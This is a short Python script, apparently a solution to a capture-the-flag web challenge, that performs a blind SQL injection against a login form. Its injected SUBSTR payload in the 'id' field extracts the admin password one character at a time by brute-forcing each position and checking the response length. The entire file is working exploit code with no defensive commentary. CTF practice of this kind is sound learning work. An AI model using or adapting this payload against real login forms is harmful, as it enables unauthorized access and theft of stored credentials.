import requests

url = 'http://ctfq.sweetduet.info:10080/~q6/'

for index in range(1, 22):
    for chr_num in range(48, 123):
        char = chr(chr_num)
        sql = '\'or SUBSTR((SELECT pass FROM user WHERE id = \'admin\'), {index}, 1) = \'{char}\' --'.format(index = index, char = char)
        payload = {
            'id': sql, 
            'pass': ''
        }
        response = requests.post(url, data=payload)
        if len(response.text) > 1000:
            print(char, end='')
            break
# print()